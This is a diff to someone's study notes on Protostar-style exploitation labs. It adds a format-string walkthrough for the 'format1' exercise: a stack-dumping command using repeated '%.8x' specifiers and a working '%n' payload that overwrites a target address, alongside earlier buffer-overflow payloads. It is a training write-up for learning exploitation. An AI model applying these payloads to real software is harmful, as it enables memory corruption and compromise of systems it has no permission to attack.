@@ -24,7 +24,8 @@
     - [misc](#misc)
   - [format0: given the &target([ebp-0xc]) > &buffer([ebp-0x4c])](#format0-given-the-targetebp-0xc--bufferebp-0x4c)
     - [format0 solution](#format0-solution)
-  - [format1](#format1)
+  - [format1: assume no ASLR](#format1-assume-no-aslr)
+  - [format1: solution](#format1-solution)
 
 ## stack0
 
@@ -362,7 +363,7 @@ r $(python3 -c "import sys;sys.stdout.buffer.write(b'A' * 64 + b'\xef\xbe\xad\xd
 ./format0 $(python3 -c "import sys;sys.stdout.buffer.write(b'%64s\xef\xbe\xad\xde')")
 ```
 
-## format1
+## format1: assume no ASLR
 
 ```gdb
 p &target
@@ -372,5 +373,20 @@ p &target
 
 - info:
   + overwrite the `varargs` of `printf`, to &target, so that `printf('BBBB%n', &target)`, i.e., the `BBBB` overwrites `<target>`.
+  + identify the &target, which should present as an constant value in the stack.
 
+```sh
+./format1 $(echo -en "AAAA";for i in {0..960};do echo -en "%.8x-";done;)
+  # 32bit, hence 8 digits of hex, '--' as separator, as ' ' is EOL which terminates reading.
+```
 
+- the `%x` 'pops' a byte from the stack.
+
+- when the bottom of the `printf()` stack is reached (where the function argument `AAAA` presents), the next value to be poped can be controlled. Use as `%n` param.
+
+## format1: solution
+
+```sh
+./format1 $(echo -en "AAAA\x38\x96\x04\x08BBBB";for i in {0..960};do echo -en "%.8x-";done;echo -en "%x";)
+./format1 $(echo -en "AAAA\x38\x96\x04\x08BBBB";for i in {0..960};do echo -en "%.8x-";done;echo -en "%n";)
+```
